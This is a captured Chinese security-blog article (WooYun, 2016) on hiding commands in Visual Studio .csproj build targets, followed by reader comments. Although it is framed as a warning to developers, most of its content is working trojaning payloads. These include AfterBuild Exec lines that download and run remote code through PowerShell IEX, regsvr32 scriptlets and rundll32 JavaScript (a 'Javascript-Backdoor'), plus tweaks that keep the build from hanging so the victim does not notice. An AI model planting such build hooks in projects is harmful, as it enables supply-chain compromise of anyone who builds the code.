@@ -1,0 +1,121 @@
+<main class="main-container ng-scope" ng-view=""><div class="main receptacle post-view ng-scope"><article class="entry ng-scope" ng-controller="EntryCtrl" ui-lightbox=""><header><h1 class="entry-title ng-binding">Pay close attention to your download code——Visual Studio trick to run code when building</h1><div class="entry-meta"><a target="_blank" class="author name ng-binding">三好学生</a> <span class="bull">·</span> <time title="2016/06/03 10:23" ui-time="" datetime="2016/06/03 10:23" class="published ng-binding ng-isolate-scope">2016/06/03 10:23</time></div></header><section class="entry-content ng-binding" ng-bind-html="postContentTrustedHtml"><p></p><h1>0x00前言</h1><hr><p><strong>本文源于一次大胆的尝试：</strong></p><p>对github上某一知名的C#工程作细微改动并推荐用户下载，用户在毫不知情的情况下往往会在查看源代码后选择编译文件，然而在编译的过程中，会隐蔽执行代码，获得用户的主机权限，细极思恐。演示如下：</p><p><img alt="Alt text" img-src="c488d76edd315f26523f6405259ef16f8b430f1a.jpg"></p><h1>0x01 背景知识</h1><hr><p>MSBuild是 Microsoft Build Engine 的缩写，代表 Microsoft 和 Visual Studio 的新的生成平台<br>MSBuild可在未安装Visual Studio的环境中编译.net的工程文件</p><h2>实例1：</h2><pre><code>#!xml
+&lt;?xml version="1.0" encoding="utf-8" ?&gt;
+&lt;Project xmlns="http://schemas.microsoft.com/developer/msbuild/2003"&gt;
+  &lt;Target Name="PrintCurrentDateTime"&gt;
+    &lt;Message Text="The current date and time is: $(&amp;#91;System.DateTime&amp;#93;::Now)." /&gt;
+  &lt;/Target&gt;
+&lt;/Project&gt;
+</code></pre><p>保存为test.csproj<br>cmd下执行：</p><pre><code>#!shell
+C:\Windows\Microsoft.Net\Framework\v4.0.30319\msbuild.exe test.csproj
+</code></pre><p>在cmd下会输出显示当前时间，如图</p><p><img alt="Alt text" img-src="9a13d463c32329cea679cb6d849b5977cff04a0f.jpg"></p><h2>实例2:</h2><pre><code>#!c
+using System;
+class Test
+{
+    static void Main()
+    {
+        Console.WriteLine("Hello world");
+    }
+}
+</code></pre><p>保存为hello.cs</p><pre><code>#!xml
+&lt;Project xmlns="http://schemas.microsoft.com/developer/msbuild/2003"&gt;
+    &lt;Target Name="Compile"&gt;
+        &lt;CSC Sources="hello.cs" OutputAssembly="hello.exe" /&gt;
+    &lt;/Target&gt;
+&lt;/Project&gt;
+</code></pre><p>保存为hello.csproj</p><p>hello.cs和hello.csproj放于同一目录<br>cmd下执行：</p><pre><code>#!shell
+C:\Windows\Microsoft.Net\Framework\v4.0.30319\msbuild.exe hello.csproj
+</code></pre><p>可以编译生成hello.exe</p><p><img alt="Alt text" img-src="518823e625b99266e093b81e5c45791cf85b2115.jpg"></p><h1>0x02 构造工程（脚本文件）</h1><hr><p>在Visual Studio下新建一个c#工程，查看目录下的.csproj文件，格式如下：</p><pre><code>#!xml
+&lt;?xml version="1.0" encoding="utf-8"?&gt;
+&lt;Project ToolsVersion="4.0" DefaultTargets="Build" xmlns="http://schemas.microsoft.com/developer/msbuild/2003"&gt;
+  &lt;Import Project="$(MSBuildExtensionsPath)\$(MSBuildToolsVersion)\Microsoft.Common.props" Condition="Exists('$(MSBuildExtensionsPath)\$(MSBuildToolsVersion)\Microsoft.Common.props')" /&gt;
+  &lt;PropertyGroup&gt;
+    &lt;Configuration Condition=" '$(Configuration)' == '' "&gt;Debug&lt;/Configuration&gt;
+    &lt;Platform Condition=" '$(Platform)' == '' "&gt;AnyCPU&lt;/Platform&gt;
+    &lt;ProjectGuid&gt;{11E01039-C952-4D78-A2E5-426B51788B7F}&lt;/ProjectGuid&gt;
+    &lt;OutputType&gt;Exe&lt;/OutputType&gt;
+    &lt;AppDesignerFolder&gt;Properties&lt;/AppDesignerFolder&gt;
+    &lt;RootNamespace&gt;ConsoleApplication3&lt;/RootNamespace&gt;
+    &lt;AssemblyName&gt;ConsoleApplication3&lt;/AssemblyName&gt;
+    &lt;TargetFrameworkVersion&gt;v4.5&lt;/TargetFrameworkVersion&gt;
+    &lt;FileAlignment&gt;512&lt;/FileAlignment&gt;
+  &lt;/PropertyGroup&gt;
+  &lt;PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Debug|AnyCPU' "&gt;
+    &lt;PlatformTarget&gt;AnyCPU&lt;/PlatformTarget&gt;
+    &lt;DebugSymbols&gt;true&lt;/DebugSymbols&gt;
+    &lt;DebugType&gt;full&lt;/DebugType&gt;
+    &lt;Optimize&gt;false&lt;/Optimize&gt;
+    &lt;OutputPath&gt;bin\Debug\&lt;/OutputPath&gt;
+    &lt;DefineConstants&gt;DEBUG;TRACE&lt;/DefineConstants&gt;
+    &lt;ErrorReport&gt;prompt&lt;/ErrorReport&gt;
+    &lt;WarningLevel&gt;4&lt;/WarningLevel&gt;
+  &lt;/PropertyGroup&gt;
+  &lt;PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Release|AnyCPU' "&gt;
+    &lt;PlatformTarget&gt;AnyCPU&lt;/PlatformTarget&gt;
+    &lt;DebugType&gt;pdbonly&lt;/DebugType&gt;
+    &lt;Optimize&gt;true&lt;/Optimize&gt;
+    &lt;OutputPath&gt;bin\Release\&lt;/OutputPath&gt;
+    &lt;DefineConstants&gt;TRACE&lt;/DefineConstants&gt;
+    &lt;ErrorReport&gt;prompt&lt;/ErrorReport&gt;
+    &lt;WarningLevel&gt;4&lt;/WarningLevel&gt;
+  &lt;/PropertyGroup&gt;
+  &lt;ItemGroup&gt;
+    &lt;Reference Include="System" /&gt;
+    &lt;Reference Include="System.Core" /&gt;
+    &lt;Reference Include="System.Xml.Linq" /&gt;
+    &lt;Reference Include="System.Data.DataSetExtensions" /&gt;
+    &lt;Reference Include="Microsoft.CSharp" /&gt;
+    &lt;Reference Include="System.Data" /&gt;
+    &lt;Reference Include="System.Xml" /&gt;
+  &lt;/ItemGroup&gt;
+  &lt;ItemGroup&gt;
+    &lt;Compile Include="Program.cs" /&gt;
+    &lt;Compile Include="Properties\AssemblyInfo.cs" /&gt;
+  &lt;/ItemGroup&gt;
+  &lt;ItemGroup&gt;
+    &lt;None Include="App.config" /&gt;
+  &lt;/ItemGroup&gt;
+  &lt;Import Project="$(MSBuildToolsPath)\Microsoft.CSharp.targets" /&gt;
+  &lt;!-- To modify your build process, add your task inside one of the targets below and uncomment it. 
+       Other similar extension points exist, see Microsoft.Common.targets.
+  &lt;Target Name="BeforeBuild"&gt;
+  &lt;/Target&gt;
+  &lt;Target Name="AfterBuild"&gt;
+  &lt;/Target&gt;
+  --&gt;
+&lt;/Project&gt;
+</code></pre><p>需要先了解以下基础知识：</p><h2>Project元素</h2><p>项目文件的最外层元素，它表示了一个项目的范围。如果缺少了这一元素，MSBuild会报错称Target元素无法识别或不被支持。</p><p>Project元素拥有多个属性，其中最常用到的是DefaultTargets属性。我们都知道，在一个项目的生成过程中可能需要完成几项不同的任务（比如编译、单元测试、check-in到源代码控制服务器中等），其中每一项任务都可以用Target来表示。对于拥有多个Target的项目，你可以通过设置Project的DefaultTargets（注意是复数）属性来指定需要运行哪（几）个Target，如果没有这个设置，MSBuild将只运行排在最前面的那个Target</p><h2>Property元素</h2><p>在项目中你肯定需要经常访问一些信息，例如需要创建的路径名、最终生成的程序集名称等。以name/value的形式添加进Property，随后就可以以$(PropertyName)的形式访问</p><h2>Item元素</h2><p>在整个项目文件中你肯定要提供一些可被引用的输入性资源(inputs)信息，比如源代码文件、引用的程序集名称、需要嵌入的图标资源等。它们应该被放在Item里，以便随时引用</p><h2>Target元素</h2><p>Target表示一个需要完成的虚拟的任务单元。每个Project可以包括一个或多个Target，从而完成一系列定制的任务。你需要给每个Target设置一个Name属性（同一Project下的两个Target不能拥有同样的Name）以便引用和区别</p><h2>Task元素</h2><p>可执行的部分,可以在Target下面放置多个Task来顺序地执行相应的任务</p><blockquote><p>部分元素定义引用+参考自<a href="http://www.cnblogs.com/shanyou/p/3452938.html">http://www.cnblogs.com/shanyou/p/3452938.html</a></p></blockquote><p>由<a href="https://msdn.microsoft.com/en-us/library/7z253716.aspx">https://msdn.microsoft.com/en-us/library/7z253716.aspx</a>可获得详细Task类的用法介绍，其中几个特别的类值得注意：</p><ul><li>Copy：复制文件</li><li>Delete：删除文件</li><li>Exec：执行命令</li><li>MakeDir：创建文件</li><li>Message：向控制台输出消息</li></ul><p>结合以上的基础知识，我们不难理解默认.csproj文件包含的信息，而在.csproj文件尾部存在一个特别的说明：</p><pre><code>#!xml
+&lt;!-- To modify your build process, add your task inside one of the targets below and uncomment it. 
+       Other similar extension points exist, see Microsoft.Common.targets.
+  &lt;Target Name="BeforeBuild"&gt;
+  &lt;/Target&gt;
+  &lt;Target Name="AfterBuild"&gt;
+  &lt;/Target&gt;
+  --&gt;
+</code></pre><p>那么，我们能否通过修改此处来操作VS编译文件的过程呢？</p><h1>0x03 添加后门测试</h1><hr><p>对于原始文档，首先去掉<code>&lt;--</code>和<code>--&gt;</code>的标记</p><h2>1、在编译过程中直接弹calc.exe</h2><p>添加代码如下：</p><pre><code>#!xml
+&lt;Target Name="AfterBuild"&gt;
+    &lt;Exec Command="calc.exe"/&gt;
+  &lt;/Target&gt;
+</code></pre><p>成功弹出计算器，build的过程卡住，手动结束calc进程，编译成功，如图：</p><p><img alt="Alt text" img-src="ad12a3383a1dc8c8c6d81fd98e72832283eb49c5.jpg"></p><p><strong>解决方法：</strong><br>解决calc进程死锁，可以通过powershell的start process异步调用来执行calc.exe<br>脚本内容为</p><pre><code>#!shell
+start-process calc.exe
+</code></pre><p>上传至github<br>使用powershell来下载执行</p><p>.csproj文件修改为：</p><pre><code>#!xml
+&lt;Target Name="AfterBuild"&gt;
+    &lt;Exec Command="powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/3gstudent/test/master/calc.ps1');"/&gt;
+  &lt;/Target&gt;
+</code></pre><p>执行如图：</p><p><img alt="Alt text" img-src="b14c548dec56701c3fd17cf931edcb011959db94.jpg"></p><h2>2、在编译过程中调用regsvr32.exe</h2><p>添加代码如下：</p><pre><code>#!xml
+&lt;Target Name="AfterBuild"&gt;
+    &lt;Exec Command="regsvr32.exe /u /s /i:https://raw.githubusercontent.com/3gstudent/SCTPersistence/master/calc.sct scrobj.dll"/&gt;
+  &lt;/Target&gt;
+</code></pre><p>使用regsvr32会在控制台输出报错提示权限不够，但依然可以成功执行命令，如图</p><p><img alt="Alt text" img-src="2752891b756e919e8a2fd4ef1c30e898eaa2ba1f.jpg"></p><h2>3、在编译过程中运行JSRAT</h2><p>使用rundll32</p><pre><code>#!xml
+rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:https://raw.githubusercontent.com/3gstudent/Javascript-Backdoor/master/test")
+</code></pre><p><code>两个""</code>中间无法再使用<code>"</code>，所以要用<code>&amp;quot;</code>来替代<code>"</code> 优化的代码如下：</p><pre><code>#!xml
+&lt;Target Name="AfterBuild"&gt;
+    &lt;Exec Command="rundll32.exe javascript:&amp;quot;\..\mshtml,RunHTMLApplication &amp;quot;;document.write();GetObject(&amp;quot;script:https://raw.githubusercontent.com/3gstudent/Javascript-Backdoor/master/test&amp;quot;)"/&gt; 
+&lt;/Target&gt;
+</code></pre><p>成功弹出计算器，但无法成功编译文件，手动结束rundll32进程，编译成功，提示rundll32调用错误</p><p><strong>解决方法：</strong><br>写临时js文件,再运行，代码如下：</p><pre><code>#!xml
+ &lt;Target Name="BeforeBuild"&gt;
+ &lt;Exec Command="echo GetObject(&amp;quot;script:https://raw.githubusercontent.com/3gstudent/Javascript-Backdoor/master/test&amp;quot;)&gt;1.js"/&gt; 
+  &lt;/Target&gt;
+  &lt;Target Name="AfterBuild"&gt;
+&lt;Exec Command="1.js"/&gt; 
+&lt;/Target&gt;
+</code></pre><p>演示略</p><h1>0x04 实际影响</h1><hr><p>任意一个c#工程，只要编辑.csproj文件,即可实现在编译过程中执行任意命令。 正如本文开始的演示图，绝大部分人从github上下载代码后，会选择直接编译，即使部分人会注意代码细节，也常常会忽略.csproj文件，并且通过Visual Studio 的操作面板无法获取添加的后门代码。</p><p><img alt="Alt text" img-src="e28fcaa6ac160cb18bb86f0c88c39e4e747c87f9.jpg"></p><p>如果别有用心的人在公开项目的.csproj文件添加了后门代码，后果将不堪设想。希望本文能引起大家对此细节的注意，尤其是开发人员，编译工程前尤其要记得查看.**proj文件的细节。亡羊而补牢，未为迟也。</p><p><strong>Poc地址：</strong><br><a href="https://github.com/3gstudent/p0wnedShell-DarkVersion">https://github.com/3gstudent/p0wnedShell-DarkVersion</a></p><h1>0x05 补充</h1><hr><p>使用Visual Studio中的其他语言也同样可以插入后门：<br><strong>Visual C++：</strong><br>- 修改.vcxproj文件</p><p><strong>Visual Basic：</strong><br>- 修改.vbproj文件</p><p><strong>Visual F#：</strong><br>- 修改.fsproj文件</p><p></p></section></article><div class="entry-controls clearfix"><div style="float:left;color:#9d9e9f;font-size:15px"><span>&copy;乌云知识库版权所有 未经许可 禁止转载</span></div></div><div id="comments" class="comment-list clearfix"><div id="comment-list"><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">xx00</span> <span class="reply-time">2016-06-17 22:51:50</span></div><p></p><p>@三好学生 你会关注？ 你只是想抄袭吧，自己拿过来演示演示，改一改就当做自己的了，还装的一手好逼。让我想起了以前各种改软件版权装X的人。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">好奇怪</span> <span class="reply-time">2016-06-09 21:10:05</span></div><p></p><p>@到此一游 文章是提醒大家注意下载的内容，哪里说不让下了？逻辑好奇怪</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">到此一游</span> <span class="reply-time">2016-06-08 07:21:29</span></div><p></p><p>按这文章说法，以后不用下载gnu 源码，makefile文件可任意插入命令</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">三好学生</span> <span class="reply-time">2016-06-06 08:35:34</span></div><p></p><p>@xx00 感谢你提供的关于make文件的思路，我会关注的。VS Build Tasks里面还有很多值得研究学习的地方。另外我想说的是希望你能发现文中的隐藏技巧:)</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">1c3z</span> <span class="reply-time">2016-06-05 21:57:37</span></div><p></p><p>Yeah that was quite interesting</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">that</span> <span class="reply-time">2016-06-05 02:02:03</span></div><p></p><p>你可以下载别人的代码来玩，你也可以上传代码来玩别人<br>这就是开源</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Explo1t</span> <span class="reply-time">2016-06-04 10:25:37</span></div><p></p><p>没看懂....</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">00xx</span> <span class="reply-time">2016-06-04 07:53:28</span></div><p></p><p>@xx00 这文章没什么营养，说好的人一定是不知道这个功能的存在，这种技俩哄哄小白还可以。这个评论适用于任意的文章～</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">xx00</span> <span class="reply-time">2016-06-03 22:37:26</span></div><p></p><p>这文章没什么营养，说好的人一定是不知道这个功能的存在，这种技俩哄哄小白还可以。实战攻击没什么普适性。再说了，你要是把这种工程传到自己的Git上，你就等着被喷死吧。另外我想说的是 Linux上的make文件能做更多，价值比这个更大。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">程序员</span> <span class="reply-time">2016-06-03 18:42:33</span></div><p></p><p>作为程序员的我以前就没有注意过这个问题</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">小白兔</span> <span class="reply-time">2016-06-03 18:15:47</span></div><p></p><p>这个方法比起在编译器的植入差不多的影响啊，小白很容易中招啊</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">毕月乌</span> <span class="reply-time">2016-06-03 18:09:08</span></div><p></p><p>@2bcoder 正常功能用作恶意攻击才是最可怕的~</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">sdf</span> <span class="reply-time">2016-06-03 17:38:54</span></div><p></p><p>弱弱的问一下,生成gif动图用的软件是哪个?</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">xxoo</span> <span class="reply-time">2016-06-03 13:23:59</span></div><p></p><p>小白最后看到弹出计算器 深深的被满足了 。。然而生成事件这功能不是是个 IDE 都有吗 ？</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">2bcoder</span> <span class="weibo"></span> <span class="reply-time">2016-06-03 13:19:03</span></div><p></p><p>无语 正常功能啊 小白们惊呼 vs 出漏洞了</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">三好学生</span> <span class="reply-time">2016-06-03 12:09:19</span></div><p></p><p>@李旭敏 前面介绍了一些基础知识，比较乱，但是想了解过程的话好好看看还是很有必要的，关于这个的更多利用方法还在探索中</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">李旭敏</span> <span class="reply-time">2016-06-03 12:01:23</span></div><p></p><p>最后看懂了，前面看的有点懵逼！</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">三好学生</span> <span class="reply-time">2016-06-03 11:44:12</span></div><p></p><p>@心伤的萝卜 那你就帮我想个好的标题呗</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">心伤的萝卜</span> <span class="reply-time">2016-06-03 11:31:15</span></div><p></p><p>好好的中文不用，标题这英文写的也是醉了。。。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">rainism</span> <span class="reply-time">2016-06-03 10:59:19</span></div><p></p><p>细思极恐</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">sco4x0</span> <span class="reply-time">2016-06-03 10:39:51</span></div><p></p><p>mark</p><p></p></div></div></div></div></div></main>
